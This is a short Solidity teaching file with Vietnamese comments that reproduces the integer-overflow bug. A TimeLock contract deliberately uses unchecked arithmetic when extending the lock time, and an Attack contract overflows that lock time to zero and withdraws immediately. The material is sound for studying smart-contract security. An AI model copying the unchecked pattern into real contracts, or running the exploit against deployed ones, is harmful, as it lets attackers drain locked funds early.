// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
        //1 week cx chỉ là quy về giây + timestamp từ epoch time mà thôi
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        //Ở phiên bản solidity 0.8 đã tự có check overflow/underflow nên lỗi này k còn nx
        //ở phiên bản cũ thì vẫn có lỗi này ta tái hiện lại
        unchecked{
            lockTime[msg.sender] += _secondsToIncrease;
        }
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");
        //ngày xưa có kiểu hack thời gian bằng cách cho overflow về 0 như này

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}
    receive() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        unchecked{//unchecked chỉ có phạm vi của contract của nó chứ gọi hàm contract khác thì 
        //thì contract khác vẫn check 
            timeLock.increaseLockTime(
                type(uint).max + 1 - timeLock.lockTime(address(this))
            );
            timeLock.withdraw();
        }
    }
}
